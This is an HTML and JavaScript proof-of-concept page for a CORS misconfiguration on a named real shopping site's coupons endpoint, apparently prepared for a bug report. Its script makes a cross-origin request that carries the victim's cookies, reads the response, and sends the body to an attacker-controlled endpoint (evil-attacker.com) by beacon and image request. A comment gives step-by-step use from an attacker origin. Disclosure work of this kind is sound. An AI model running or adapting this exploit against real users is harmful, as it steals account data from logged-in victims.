<!doctype html>
<html lang="en">
<head>
  <meta charset="utf-8" />
  <title>OPPO CORS PoC — coupons exfil</title>
  <meta name="viewport" content="width=device-width,initial-scale=1" />
  <style>
    body { font-family: ui-monospace, SFMono-Regular, Menlo, Consolas, "Liberation Mono", monospace; padding: 16px; }
    .ok { color: #0a0; }
    .warn { color: #b58900; }
    .err { color: #d00; }
    pre { white-space: pre-wrap; word-break: break-word; padding: 12px; background: #f6f8fa; border-radius: 8px; }
    code { background: #f6f8fa; padding: .2em .35em; border-radius: 6px; }
    .row { margin: 10px 0; }
    input, button { font-size: 14px; padding: 8px 10px; border-radius: 8px; border: 1px solid #ccc; }
    button { cursor: pointer; }
  </style>
</head>
<body>
  <h1>OPPO CORS Misconfig PoC</h1>

  <div class="row">
    <label>Target URL:&nbsp;
      <input id="target" size="70" value="https://www.opposhop.cn/cn/web/coupons" />
    </label>
  </div>

  <div class="row">
    <label>Exfil Endpoint (optional):&nbsp;
      <input id="exfil" size="70" placeholder="https://evil-attacker.com/log" />
    </label>
  </div>

  <div class="row">
    <button id="run">Run PoC (credentials included)</button>
  </div>

  <div class="row">
    <div id="status">status: <em>idle</em></div>
  </div>

  <h3>Response headers</h3>
  <pre id="hdrs">(none yet)</pre>

  <h3>Response body</h3>
  <pre id="body">(none yet)</pre>

  <script>
    // helper: stringify headers
    function headersToObject(headers) {
      const obj = {};
      headers.forEach((v, k) => obj[k] = v);
      return obj;
    }

    // helper: safe base64
    function b64(str) {
      return btoa(unescape(encodeURIComponent(str)));
    }

    async function run() {
      const target = document.getElementById('target').value.trim();
      const exfil = document.getElementById('exfil').value.trim();
      const status = document.getElementById('status');
      const hdrsPre = document.getElementById('hdrs');
      const bodyPre = document.getElementById('body');

      status.innerHTML = 'status: <span class="warn">fetching… (with credentials)</span>';

      try {
        // IMPORTANT: credentials: 'include' sends victim cookies to target
        const res = await fetch(target, {
          method: 'GET',
          credentials: 'include',        // <— critical for CORS+cookies
          // DO NOT add custom headers; that would trigger preflight and may differ from real-world fetches
          mode: 'cors'
        });

        const text = await res.text();

        // show headers
        const hdrObj = headersToObject(res.headers);
        hdrsPre.textContent = JSON.stringify(hdrObj, null, 2);

        // extract ACAO/ACC for quick verdict
        const acao = res.headers.get('access-control-allow-origin');
        const acc  = res.headers.get('access-control-allow-credentials');

        // show body
        bodyPre.textContent = text;

        // verdict message
        const sameOriginReflected = acao && (acao === window.location.origin || acao === '*');
        const attackerReflected  = acao && (acao === window.location.origin);
        const likelyVuln = acao && acc === 'true';

        if (likelyVuln) {
          status.innerHTML = `status: <span class="ok">candidate vuln — ACAO: ${acao}, ACC: ${acc}</span>`;
        } else {
          status.innerHTML = `status: <span class="warn">no exploitable CORS observed (ACAO: ${acao || 'null'}, ACC: ${acc || 'null'})</span>`;
        }

        // OPTIONAL: exfiltrate to your server (works best if you host this PoC on that server)
        if (exfil) {
          // Preferred: sendBeacon (fires even on unload; cross-origin allowed)
          const payload = JSON.stringify({
            ts: Date.now(),
            target,
            origin: window.location.origin,
            headers: hdrObj,
            body_b64: b64(text).slice(0, 800000) // guard huge bodies
          });
          navigator.sendBeacon(exfil, new Blob([payload], { type: 'application/json' }));

          // Fallback using GET img beacon if sendBeacon is blocked
          const u = exfil + '?t=' + Date.now() + '&target=' + encodeURIComponent(target) + '&b=' + encodeURIComponent(b64(text).slice(0, 6000));
          const img = new Image();
          img.src = u;
        }

      } catch (e) {
        status.innerHTML = 'status: <span class="err">error: ' + (e && e.message ? e.message : e) + '</span>';
        console.error(e);
      }
    }

    document.getElementById('run').addEventListener('click', run);

    // Optional: auto-run on load
    // window.addEventListener('load', run);
  </script>

  <!--
    HOW TO USE (authorized testing only):
    1) Log in to https://www.opposhop.cn in your browser (same profile).
    2) Open this file from https://evil-attacker.com (your attacker origin).
    3) Click "Run PoC". If the target reflects ACAO as your attacker origin and ACC=true,
       the body will render here and can be exfiltrated to your endpoint.
    4) Attach screenshots of:
       - Network panel showing request from evil-attacker.com -> target with credentials
       - Response headers (ACAO/ACC)
       - Sensitive content in the response body (account-bound coupons or user data)
  -->
</body>
</html>
